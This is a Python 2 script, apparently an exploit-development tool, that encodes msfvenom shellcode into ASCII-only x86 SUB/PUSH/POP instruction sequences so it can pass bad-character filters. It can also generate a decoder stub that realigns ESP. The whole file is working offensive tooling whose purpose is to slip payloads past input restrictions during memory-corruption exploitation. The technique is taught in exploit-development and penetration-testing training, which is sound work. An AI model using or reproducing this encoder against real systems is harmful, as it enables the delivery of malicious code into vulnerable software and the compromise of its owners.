import sys
import string
import optparse 

header  = "#"*50+"\n"
header += "$ SUB/PUSH/POP based ASCII shellcode encoder."+"\n"
header += "$ This technique was originally used by Mati Aharoni (@muts) for bypassing limited character set."+"\n"
header += "$ Script takes msfvenom output in C format and creates full ascii version by using SUB/PUSH/POP instructions."+"\n"
header += "$ You should provide ESP and memory location where shellcode will be decoded."+"\n"
header += "$ Use '--stub true' to add this."+"\n"
header += "(($)) Written by Abdulla Ismayilov (@infosec_prof)"+"\n"
header += "#"*50+"\n\n"

parser = optparse.OptionParser(header+"usage: python "+sys.argv[0]+" -f <shellcode file to encode> -b <bad chars>")
parser.add_option('-b','--bad',dest='bad_chars',type='string', help='Bad characters to avoid in \\x format')
parser.add_option('-f','--file',dest='filename',type='string', help='Shellcode text file to encode in \\x format')
parser.add_option('-s','--stub',dest='stub',type='string', help='Creating Stub for Shellcode')
(options,args) = parser.parse_args()


if(options.filename == None):
	print parser.usage
	sys.exit(0)


filename = options.filename

def readbytes(filename):
	chunks = []
	temp = []
	handle = open(filename)
	data = handle.read()
	data = data.replace("\n","")
	data = data.replace("\r","")
	data = data.replace("\\x","")
	data = data.replace("'","")
	data = data.replace('"',"")
   
	data = data+(4-(len(data)/2))%4*'90'
	i=0
	temp_data = ""
   
	for bytes in data:

		temp_data += bytes
		i+=1
	   
		if(i==8):
			temp.append(temp_data)
			temp_data = ""
			i=0
   
	temp = list(reversed(temp))
   
	for ch in temp:
		temp_data = ch[6:]+ch[4:6]+ch[2:4]+ch[0:2]
		chunks.append(temp_data)
   
	return chunks
 

#print  readbytes(filename)
#sys.exit(0)

def tohex(val, nbits):
	return hex((val + (1 << nbits)) % (1 << nbits))

def encode(user_input=None):
	final_out = ""
	qaliq = []
	all_chars = range(32,128)
	compl = []
	if(user_input is not None):
		chunks = user_input
		#sys.exit(0)
	else:
		chunks = readbytes(filename)
	
	for ch in chunks:
		ins = "[1][2][3][4]\n[5][6][7][8]\n[9][10][11][12]\n"
		complement = tohex(0-int(ch,16),64)[10:][:-1]
		compl.append(complement)
		first = complement[0:2]
		second = complement[2:4]
		third = complement[4:6]
		fourth = complement[6:]
		
		fq=0
		if(int(fourth,16)/3 in all_chars):
			ins = ins.replace("[4]",hex(int(fourth,16)/3)[2:])
			ins = ins.replace("[8]",hex(int(fourth,16)/3)[2:])
			ins = ins.replace("[12]",hex(int(fourth,16)/3+int(fourth,16)%3)[2:])

		else:
			start=1
			while(not int(fourth,16)/3 in all_chars):
				newf = str(start)+fourth
				if(int(newf,16)/3 in all_chars):
					fq=1
					ins = ins.replace("[4]",hex(int(newf,16)/3)[2:])
					ins = ins.replace("[8]",hex(int(newf,16)/3)[2:])
					ins = ins.replace("[12]",hex((int(newf,16)/3)+int(newf,16)%3)[2:])

					qaliq.append(start)
					break
				start+=1
		
		tq = 0
		
		if(int(third,16)/3 in all_chars):
			ins = ins.replace("[3]",hex(int(third,16)/3)[2:])
			ins = ins.replace("[7]",hex(int(third,16)/3)[2:])
			if(fq==1):
				ins = ins.replace("[11]",hex(int(third,16)/3+int(third,16)%3-qaliq[len(qaliq)-1])[2:])
				
			else:
				ins = ins.replace("[11]",hex(int(third,16)/3+int(third,16)%3)[2:])

		else:
			start=1
			while(not int(third,16)/3 in all_chars):
				newt = str(start)+third
				if(int(newt,16)/3 in all_chars):
					tq=1
					ins = ins.replace("[3]",hex(int(newt,16)/3)[2:])
					ins = ins.replace("[7]",hex(int(newt,16)/3)[2:])
					if(fq==1):
						ins = ins.replace("[11]",hex((int(newt,16)/3)+int(newt,16)%3-qaliq[len(qaliq)-1])[2:])
					else:
						ins = ins.replace("[11]",hex((int(newt,16)/3)+int(newt,16)%3)[2:])

					qaliq.append(start)
					break
				start+=1

		sq = 0
		
		if(int(second,16)/3 in all_chars):
			ins = ins.replace("[2]",hex(int(second,16)/3)[2:])
			ins = ins.replace("[6]",hex(int(second,16)/3)[2:])
			if(tq==1):
				ins = ins.replace("[10]",hex(int(second,16)/3+int(second,16)%3-qaliq[len(qaliq)-1])[2:])
				
			else:
				ins = ins.replace("[10]",hex(int(second,16)/3+int(second,16)%3)[2:])

		else:
			start=1
			while(not int(second,16)/3 in all_chars):
				news = str(start)+second
				if(int(news,16)/3 in all_chars):
					sq=1
					ins = ins.replace("[2]",hex(int(news,16)/3)[2:])
					ins = ins.replace("[6]",hex(int(news,16)/3)[2:])
					if(tq==1):
						ins = ins.replace("[10]",hex((int(news,16)/3)+int(news,16)%3-qaliq[len(qaliq)-1])[2:])
					else:
						ins = ins.replace("[10]",hex((int(news,16)/3)+int(news,16)%3)[2:])

					qaliq.append(start)
					break
				start+=1
					

		fiq = 0
		
		if(int(first,16)/3 in all_chars):
			ins = ins.replace("[1]",hex(int(first,16)/3)[2:])
			ins = ins.replace("[5]",hex(int(first,16)/3)[2:])
			if(sq==1):
				ins = ins.replace("[9]",hex(int(first,16)/3+int(first,16)%3-qaliq[len(qaliq)-1])[2:])
				
			else:
				ins = ins.replace("[9]",hex(int(first,16)/3+int(first,16)%3)[2:])

		else:
			start=1
			while(not int(first,16)/3 in all_chars):
				newfi = str(start)+first
				if(int(newfi,16)/3 in all_chars):
					fiq=1
					ins = ins.replace("[1]",hex(int(newfi,16)/3)[2:])
					ins = ins.replace("[5]",hex(int(newfi,16)/3)[2:])
					if(tq==1):
						ins = ins.replace("[9]",hex((int(newfi,16)/3)+int(newfi,16)%3-qaliq[len(qaliq)-1])[2:])
					else:
						ins = ins.replace("[9]",hex((int(newfi,16)/3)+int(newfi,16)%3)[2:])

					qaliq.append(start)
					break
				start+=1
		
		hisse = ins.split("\n")
		calc = int(complement,16)-int(hisse[0],16)-int(hisse[1],16)
		l = tohex(calc,64)

		if(len(l)>11):
			f = l[10:][:-1]
		else:
			f = l[2:][:-1]
		
		if(not f == hisse[2] ):
			ins = ins.replace(hisse[2],f)
		
		#print "[*] Debug: " 	
		final_out+=ins+"|"
		
	return final_out
	

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

	

print header
	
shellcode = ""

if(options.stub is not None):
	esp = raw_input("[?] Please give ESP value as input: ")
	# esp = "12fad53a"
	# esp = "12011005"
	ret_addr = raw_input("[?] Please provide where to write: ")
	# ret_addr = "12ffde5a"
	# substract = tohex(0-(int(ret_addr, 16) - int(esp, 16)),60)[:-1][2:][7:]
	substract = tohex(0-(int(esp, 16) - int(ret_addr, 16)),60)[:-1][2:]
	# print substract
	t_s = []
	t_s.append(substract)
	res = encode(t_s)
	
	res = res.replace("|","")
	res = res.split("\n")
	del res[len(res)-1]
	#print res
	# print res
	shellcode += "\\x25\\x4a\\x4d\\x4e\\x55"
	shellcode += "\\x25\\x35\\x32\\x31\\x2a"
	shellcode += "\\x54"
	shellcode += "\\x58"
	
	for stubs in res:
		chunk_st = list(reversed(list(chunkstring(stubs,2))))
		shellcode += "\\x2d"
		for st in chunk_st:
			shellcode += "\\x"+st
	shellcode += "\\x50"
	shellcode += "\\x5c"
	
	#print shellcode
	#sys.exit(0)
	
	
ascii_values = encode()
ascii_values = ascii_values.split("|")
#print ascii_values

size_orig = len(readbytes(filename))*4
del ascii_values[len(ascii_values)-1]

for counterparts in ascii_values:
	shellcode += "\\x25\\x4a\\x4d\\x4e\\x55"
	shellcode += "\\x25\\x35\\x32\\x31\\x2a"
	p = counterparts.split("\n")
	del p[len(p)-1]
	
	for opcodes in p:
		shellcode += "\\x2d"
		c=0
		opcodes = list(reversed(list(chunkstring(opcodes,2))))
		opcodes = "".join(opcodes)
		
		for bytes in opcodes:
			if(c%2==0):
				shellcode += "\\x"
			shellcode += bytes
			c+=1
	shellcode += "\\x50"
	shellcode += "\\x41"*2
	

#12fa5119
#print encode(['1951fa12'])

#sys.exit(0)


print "[*] Generated shellcode [Python format]: \n"

#print "*"*50+"\n\n"

print "shellcode = ("
for i in chunkstring(shellcode,60):
	print '"'+i+'"'
	
print ")\n"

print "\n"+"*"*50

print "[*] Generated shellcode [ASCII format]: \n\n"

#print "*"*50+"\n\n"
ascii_sh = shellcode.replace("\\x","")
print ascii_sh.decode('hex')
print "\n"+"*"*50+"\n"
print "[*] Binary format:\n"
bin = list(chunkstring(ascii_sh,2))
print " ".join(bin)
print "\n"+"*"*50+"\n"
print "[*] Original size: "+ str(size_orig)
print "[*] Encoded  size: "+ str(len(ascii_sh)/2)

if(options.stub is None):
	print "\n"
	print "***WARNING***"
	print "[-] Stub is not generated! Shellcode cannot decode itself without that. Either manually add stub to shellcode (by decreasing ESP) or use script with '--stub true' arguments to create stub.\n"
